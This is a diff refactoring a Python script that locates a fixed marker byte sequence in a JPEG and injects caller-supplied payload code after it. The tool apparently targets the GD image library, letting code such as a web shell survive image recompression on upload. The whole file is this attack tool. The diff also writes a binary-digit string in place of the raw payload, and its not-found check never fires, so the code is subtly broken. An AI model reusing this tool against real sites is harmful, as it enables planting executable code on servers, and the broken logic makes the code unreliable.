@@ -2,46 +2,52 @@
 import sys
 import binascii
 
-magic_number = "03010002110311003f00" 
+MAGIC_NUMBER = "03010002110311003f00"
 
 def main():
 
     if len(sys.argv) != 4:
-        print("USAGE: <gd-jpeg> <payload> <output_name>")
+        print("USAGE: <jpeg file path> <payload code> <output path>")
         sys.exit()
 
-    jpeg = sys.argv[1]
-    payload = sys.argv[2]
-    output = sys.argv[3]
+    path_to_vector_image = sys.argv[1]
+    payload_code = sys.argv[2]
+    path_to_output = sys.argv[3]
 
-    loc = get_loc(jpeg)
-    inject_payload(jpeg, loc, payload, output)
+    magic_number_index = find_magic_number_index(path_to_vector_image)
+    inject_payload(
+        path_to_vector_image,
+        magic_number_index,
+        payload_code,
+        path_to_output)
 
-def get_loc(jpeg):
+def find_magic_number_index(jpeg_path):
 
     print("Searching for magic number...")
-    with open(jpeg, 'rb') as f:
-        contents = f.read()
-        loc = contents.find(binascii.unhexlify(magic_number))
-    
-    if loc:
+    with open(jpeg_path, 'rb') as f:
+        bin_contents = f.read()
+        bin_magic_number = binascii.unhexlify(MAGIC_NUMBER)
+        index = bin_contents.find(bin_magic_number)
+
+    if index:
         print("Found magic number.")
-        return loc
+        return index
     else:
         print("Magic number not found. Exiting.")
         sys.exit()
 
-def inject_payload(jpeg, loc, payload, output):
+def inject_payload(jpeg_path, index, payload, output_path):
 
     bin_payload = bin(int(binascii.hexlify(payload),16))
+    bin_magic_number = binascii.unhexlify(MAGIC_NUMBER)
 
-    with open(jpeg, 'rb') as f:
-        with open(output, 'wb') as fo:
+    with open(jpeg_path, 'rb') as f:
+        with open(output_path, 'wb') as fo:
             print("Injecting payload...")
-            contents = f.read()
-            pre_payload = contents[:loc + len(binascii.unhexlify(magic_number))]
-            post_payload = contents[loc + len(binascii.unhexlify(magic_number)) + len(payload):]
-            fo.write(pre_payload + payload + post_payload + '\n')
+            bin_contents = f.read()
+            pre_payload = bin_contents[:index + len(bin_magic_number)]
+            post_payload = bin_contents[index + len(bin_magic_number) + len(payload):]
+            fo.write(pre_payload + bin_payload + post_payload + '\n')
             print("Payload written.")
 
 if __name__ == "__main__":
